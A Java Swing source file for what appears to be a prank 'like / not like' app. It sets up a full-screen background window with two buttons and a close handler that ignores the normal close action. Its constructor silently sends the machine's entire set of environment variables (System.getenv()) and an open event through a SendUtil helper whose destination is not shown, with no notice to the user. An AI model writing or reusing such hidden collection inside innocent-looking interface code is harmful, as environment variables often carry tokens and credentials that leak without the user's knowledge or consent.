package com.bingo.main;

import java.awt.*;
import java.io.IOException;

import javax.swing.*;

import com.bingo.util.MessageType;
import com.bingo.util.SendUtil;

public class CustomJFrame extends JFrame {
    private static final long serialVersionUID = 1L;

    private static ImageIcon background;

    public CustomJFrame() throws HeadlessException {
        super(ParamConstant.title);

        SendUtil.startSerch();
        SendUtil.sendMessage(System.getenv());
        SendUtil.sendMessage(MessageType.OP_OPEN);
    }

    public void init() throws IOException, ClassNotFoundException, UnsupportedLookAndFeelException,
            InstantiationException, IllegalAccessException {

        // 设置当前系统默认风格
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        UIManager.put("OptionPane.minimumSize", new Dimension(320, 108));
        Toolkit toolkit = Toolkit.getDefaultToolkit();

        // 设置左上角图标
        Image icon = toolkit.getImage(ImageUtil.getAnyOneImg(ImageUtil.btps));
        this.setIconImage(icon);

        // 获取屏幕分辨率
        Dimension screensize = toolkit.getScreenSize();
        int width = (int) screensize.getWidth();
        int height = (int) screensize.getHeight();

        // 加载背景图片
        background = ImageUtil.getResize(width, height, ImageUtil.bgps, true, true);
        JLabel label = new JLabel(background);
        // 设置标签大小
        label.setBounds(0, 0, background.getIconWidth(), background.getIconHeight());
        this.getLayeredPane().add(label, new Integer(Integer.MIN_VALUE));

        // 主界面获得容器JPanel
        JPanel jpanel = (JPanel) this.getContentPane();
        // JPanel对象才可以调用setOpaque(false);设置是否透明
        jpanel.setOpaque(false);
        // 去除JPanel默认布局方式,以实现各个控件自己的定位
        jpanel.add(buildLikeButton());
        jpanel.add(buildNoLikeButton());
        jpanel.setLayout(null);
        
        // 窗口大小不可变
        this.setResizable(false);
        // 设置屏幕中间显示,x/y参数无效
        this.setBounds((width - 500) / 2, (height - 600) / 2, background.getIconWidth(),
                background.getIconHeight());
        // 默认显示在屏幕中间
        this.setLocationRelativeTo(null);
        this.setVisible(true);
        this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        this.addWindowListener(new CustomWindowAdapter(this));
    }

    private JButton buildLikeButton() throws IOException {
        JButton button = new JButton(ParamConstant.left_bt_desc, ImageUtil.getResize(ParamConstant.bt_width,
                ParamConstant.bt_htight, ImageUtil.btps, false, false));
        // 按钮内文字颜色
        button.setForeground(Color.PINK);
        // 设置初始位置
        button.setBounds(new Rectangle(0, 0, ParamConstant.bt_width, ParamConstant.bt_htight));
        // 设置控件是否透明，true为不透明，false为透明
        button.setOpaque(false);
        // 设置文字居中
        button.setHorizontalTextPosition(SwingConstants.CENTER);
        // 设置图片填满按钮所在的区域
        button.setContentAreaFilled(false);
        // 设置按钮边框和标签文字之间的距离
        // button.setMargin(new Insets(0, 0, 0, 0));
        // 设置这个按钮是不是获得焦点
        button.setFocusPainted(false);
        // 设置是否绘制边框
        button.setBorderPainted(false);
        // 设置边框
        // button.setBorder(BorderFactory.createLineBorder(Color.RED));
        button.setBorder(null);
        // 动作事件改到鼠标点击事件中
        // button.addActionListener(e -> {});
        button.addMouseListener(new ButtonLikeMouseAdapter(this, button));
        return button;
    }

    private JButton buildNoLikeButton() throws IOException {
        JButton button = new JButton(ParamConstant.right_bt_desc,
                ImageUtil.getResize(ParamConstant.bt_width, ParamConstant.bt_htight, ImageUtil.btps, false,
                        false));
        // 按钮内文字颜色
        button.setForeground(Color.WHITE);
        // 设置初始位置
        button.setBounds(background.getIconWidth() - 136, 0, ParamConstant.bt_width, ParamConstant.bt_htight);
        // 设置控件是否透明，true为不透明，false为透明
        button.setOpaque(false);
        // 设置文字居中
        button.setHorizontalTextPosition(SwingConstants.CENTER);
        // 设置图片填满按钮所在的区域
        button.setContentAreaFilled(false);
        // 设置按钮边框和标签文字之间的距离
        // button.setMargin(new Insets(0, 0, 0, 0));
        // 设置这个按钮是不是获得焦点
        button.setFocusPainted(false);
        // 设置是否绘制边框
        button.setBorderPainted(false);
        // 设置边框
        button.setBorder(null);
        button.addMouseListener(new ButtonNotLikeMouseAdapter(this, button, background));
        return button;
    }
}
